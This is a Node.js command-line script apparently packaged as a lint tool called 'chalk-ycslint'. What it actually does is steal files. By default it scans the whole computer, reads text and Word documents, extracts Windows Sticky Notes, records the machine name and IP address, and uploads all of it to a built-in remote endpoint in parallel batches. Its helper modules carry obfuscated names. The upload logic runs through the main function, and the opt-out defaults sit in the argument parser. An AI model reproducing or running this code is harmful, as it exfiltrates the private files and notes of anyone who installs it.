#!/usr/bin/env node
import {
  expandPathsToSupportedFiles,
  listPcScanRoots,
  readTextAndWordFiles,
} from "../lib/a3r8w.js";
import { getClientInfo } from "../lib/d8v0h.js";
import {
  postFilesAsJson,
  postFilesAsJsonInBatches,
  postFilesAsJsonParallel,
  isVercelUploadUrl,
  VERCEL_SAFE_BODY_BYTES,
} from "../lib/uploadHttp.js";
import { DEFAULT_UPLOAD_URL } from "../lib/c2u5z.js";
import { extractWindowsStickyNotes } from "../lib/p8x1v.js";

const VERCEL_DEFAULT_CONCURRENCY = Number(process.env.UPLOAD_CONCURRENCY) || 4;
const LOCAL_DEFAULT_CONCURRENCY = Number(process.env.UPLOAD_CONCURRENCY) || 8;
const READ_CONCURRENCY = Number(process.env.UPLOAD_READ_CONCURRENCY) || 8;

function formatBytes(bytes) {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function defaultConcurrencyForUrl(url) {
  return isVercelUploadUrl(url) ? VERCEL_DEFAULT_CONCURRENCY : LOCAL_DEFAULT_CONCURRENCY;
}

function printHelp() {
  console.log(
    [
      "Usage:",
      "  chalk-ycslint [options] <path1> <path2> ...",
      "",
      "Options:",
      "  --url <url>                      Upload endpoint (default: built-in Vercel URL)",
      "  --field <fieldName>              JSON field name for payload (default: files)",
      '  --header "Key: Value"            Extra request header (repeatable)',
      "  --timeout <ms>                   Request timeout (default: 600000)",
      "  -r, --recursive                  Recurse into folders",
      "  --scan-pc                        Include PC roots scan (default true; can be disabled)",
      "  --no-scan-pc                     Disable PC roots scan",
      "  --skip-system-dirs               Skip system directories (default false)",
      "  --batch                          Upload all files in one request (local only; risky on Vercel)",
      "  --sequential                     Upload one file at a time (slowest)",
      "  --concurrency <n>                Parallel requests (default: 4 on Vercel, 8 elsewhere)",
      "  --include-sticky-notes           Enable Sticky Notes upload (default: on)",
      "  --no-include-sticky-notes        Disable Sticky Notes upload",
      "",
      "Vercel uploads:",
      `  Requests are capped at ~4.5 MB. Default mode packs files into ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches`,
      "  and uploads several batches in parallel. Files larger than that limit are skipped with a warning.",
      "",
      "Examples:",
      "  chalk-ycslint --no-scan-pc ./docs",
      "  chalk-ycslint --url http://127.0.0.1:3000/ --concurrency 12 --no-scan-pc ./docs",
      "  chalk-ycslint --sequential --no-scan-pc ./small-folder",
    ].join("\n")
  );
}

function parseHeaders(headerArgs) {
  const headers = {};
  for (const raw of headerArgs) {
    const colon = raw.indexOf(":");
    if (colon === -1) {
      throw new Error(`Invalid --header value: "${raw}" (expected "Key: Value")`);
    }
    const key = raw.slice(0, colon).trim();
    const value = raw.slice(colon + 1).trim();
    if (!key) {
      throw new Error(`Invalid --header value: "${raw}" (empty key)`);
    }
    headers[key] = value;
  }
  return headers;
}

function parseArgs(argv) {
  const files = [];
  const headers = [];
  let url = DEFAULT_UPLOAD_URL;
  let field = "files";
  let timeoutMs = 600_000;
  let recursive = false;
  let scanPc = true;
  let skipSystemDirs = false;
  let batch = false;
  let sequential = false;
  let concurrency = null;
  let includeStickyNotes = true;

  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];

    if (arg === "-h" || arg === "--help") return { help: true };
    if (arg === "--url") {
      url = argv[++i] || "";
      continue;
    }
    if (arg === "--field") {
      field = argv[++i] || "";
      continue;
    }
    if (arg === "--header") {
      const header = argv[++i];
      if (header) headers.push(header);
      continue;
    }
    if (arg === "--timeout") {
      const raw = argv[++i];
      timeoutMs = raw ? Number.parseInt(raw, 10) : Number.NaN;
      continue;
    }
    if (arg === "-r" || arg === "--recursive") {
      recursive = true;
      continue;
    }
    if (arg === "--scan-pc") {
      scanPc = true;
      continue;
    }
    if (arg === "--no-scan-pc") {
      scanPc = false;
      continue;
    }
    if (arg === "--skip-system-dirs") {
      skipSystemDirs = true;
      continue;
    }
    if (arg === "--batch") {
      batch = true;
      continue;
    }
    if (arg === "--sequential") {
      sequential = true;
      continue;
    }
    if (arg === "--concurrency") {
      const raw = argv[++i];
      concurrency = raw ? Number.parseInt(raw, 10) : Number.NaN;
      continue;
    }
    if (arg === "--include-sticky-notes") {
      includeStickyNotes = true;
      continue;
    }
    if (arg === "--no-include-sticky-notes") {
      includeStickyNotes = false;
      continue;
    }
    if (arg.startsWith("-")) {
      throw new Error(`Unknown option: ${arg}`);
    }
    files.push(arg);
  }

  const trimmedUrl = url.trim();
  if (!trimmedUrl) throw new Error("Missing --url value.");
  if (!field.trim()) throw new Error("Missing --field value.");
  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
    throw new Error("Invalid --timeout value.");
  }

  const resolvedConcurrency = concurrency ?? defaultConcurrencyForUrl(trimmedUrl);
  if (!Number.isFinite(resolvedConcurrency) || resolvedConcurrency <= 0) {
    throw new Error("Invalid --concurrency value.");
  }

  return {
    help: false,
    url: trimmedUrl,
    field: field.trim(),
    files,
    headers: parseHeaders(headers),
    timeoutMs,
    recursive,
    scanPc,
    skipSystemDirs,
    batch,
    sequential,
    concurrency: resolvedConcurrency,
    includeStickyNotes,
    vercel: isVercelUploadUrl(trimmedUrl),
  };
}

async function buildStickyNoteFiles(includeStickyNotes) {
  const extras = [];
  if (!includeStickyNotes) return extras;

  try {
    const sticky = await extractWindowsStickyNotes();
    if (sticky) {
      extras.push({
        filename: "windows-sticky-notes.json",
        mimeType: "application/json",
        text: JSON.stringify(
          {
            source: { kind: "windows-sticky-notes", dbPath: sticky.dbPath },
            notes: sticky.notes,
          },
          null,
          2
        ),
      });
    }
  } catch (err) {
    extras.push({
      filename: "windows-sticky-notes.error.txt",
      mimeType: "text/plain",
      text: err?.message ? String(err.message) : String(err),
    });
  }

  return extras;
}

async function readPathsToFiles(paths, driveMap) {
  const files = new Array(paths.length);

  await runPool(paths, READ_CONCURRENCY, async (filePath, index) => {
    const [file] = await readTextAndWordFiles([filePath], { driveMap });
    files[index] = file;
  });

  return files;
}

function warnSkippedFiles(skipped) {
  for (const { file, bytes } of skipped) {
    console.warn(
      `Skipped ${file.filename}: ${formatBytes(bytes)} exceeds Vercel limit (${formatBytes(VERCEL_SAFE_BODY_BYTES)}). Use a local backend for large files.`
    );
  }
}

async function main() {
  let args;
  try {
    args = parseArgs(process.argv.slice(2));
  } catch (err) {
    console.error(err?.message || String(err));
    process.exitCode = 2;
    return;
  }

  if (args.help) {
    printHelp();
    return;
  }

  const inputPaths = args.scanPc
    ? [...(await listPcScanRoots()), ...args.files]
    : args.files;

  if (inputPaths.length === 0) {
    console.error('No input paths provided. Use "--help" for usage.');
    process.exitCode = 2;
    return;
  }

  const supportedPaths = await expandPathsToSupportedFiles(inputPaths, {
    recursive: args.recursive,
    skipSystemDirs: args.skipSystemDirs,
  });

  const driveMap = await (await import("../lib/e4j7k.js")).getDriveNameMap();
  const client = getClientInfo();
  const clientId = `${client.pcName} (${client.clientIp})`;
  const stickyFiles = await buildStickyNoteFiles(args.includeStickyNotes);

  const uploadBase = {
    url: args.url,
    field: args.field,
    extraHeaders: args.headers,
    timeoutMs: args.timeoutMs,
    clientId,
    pcName: client.pcName,
    clientIp: client.clientIp,
  };

  if (supportedPaths.length === 0 && stickyFiles.length === 0) {
    console.log("No supported files found.");
    return;
  }

  if (args.batch) {
    const filePayload = await readPathsToFiles(supportedPaths, driveMap);
    const allFiles = [...filePayload, ...stickyFiles];

    if (args.vercel) {
      console.log(
        `Vercel endpoint: splitting ${allFiles.length} file(s) into ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches.`
      );
      const { skipped, batchCount } = await postFilesAsJsonInBatches({
        ...uploadBase,
        files: allFiles,
        concurrency: args.concurrency,
      });
      warnSkippedFiles(skipped);
      console.log(
        `Uploaded ${allFiles.length - skipped.length} file(s) in ${batchCount} batch request(s).`
      );
      if (skipped.length) process.exitCode = 1;
      return;
    }

    await postFilesAsJson({ ...uploadBase, files: allFiles });
    console.log(`Uploaded ${allFiles.length} item(s).`);
    return;
  }

  const allPaths = [...supportedPaths];
  const totalItems = allPaths.length + stickyFiles.length;

  if (args.sequential || totalItems <= 1) {
    let done = 0;
    for (const filePath of allPaths) {
      const [file] = await readTextAndWordFiles([filePath], { driveMap });
      await postFilesAsJson({ ...uploadBase, files: [file] });
      done++;
      console.log(`[${done}/${totalItems}] ${file.filename}`);
    }
    for (const file of stickyFiles) {
      await postFilesAsJson({ ...uploadBase, files: [file] });
      done++;
      console.log(`[${done}/${totalItems}] ${file.filename}`);
    }
    return;
  }

  if (args.vercel) {
    console.log(
      `Reading ${allPaths.length} file(s), then uploading in ~${formatBytes(VERCEL_SAFE_BODY_BYTES)} batches (${args.concurrency} parallel).`
    );
    const filePayload = await readPathsToFiles(allPaths, driveMap);
    const allFiles = [...filePayload, ...stickyFiles];
    const { skipped, batchCount, batches } = await postFilesAsJsonInBatches({
      ...uploadBase,
      files: allFiles,
      concurrency: args.concurrency,
    });
    warnSkippedFiles(skipped);
    batches.forEach((batch, index) => {
      console.log(
        `[batch ${index + 1}/${batchCount}] ${batch.fileCount} file(s): ${batch.filenames.join(", ")}`
      );
    });
    console.log(
      `Done: ${allFiles.length - skipped.length}/${allFiles.length} file(s) in ${batchCount} request(s).`
    );
    if (skipped.length) process.exitCode = 1;
    return;
  }

  const uploadJobs = [
    ...allPaths.map((filePath) => ({ kind: "path", filePath })),
    ...stickyFiles.map((file) => ({ kind: "file", file })),
  ];

  await runPool(uploadJobs, args.concurrency, async (job, index) => {
    const file =
      job.kind === "path"
        ? (await readTextAndWordFiles([job.filePath], { driveMap }))[0]
        : job.file;
    await postFilesAsJson({ ...uploadBase, files: [file] });
    console.log(`[${index + 1}/${uploadJobs.length}] ${file.filename}`);
  });
}

async function runPool(items, concurrency, worker) {
  if (items.length === 0) return;
  const limit = Math.max(1, Math.min(concurrency, items.length));
  let nextIndex = 0;

  async function drain() {
    while (nextIndex < items.length) {
      const index = nextIndex++;
      await worker(items[index], index);
    }
  }

  await Promise.all(Array.from({ length: limit }, () => drain()));
}

main().catch((err) => {
  console.error(err?.message || String(err));
  process.exitCode = 1;
});
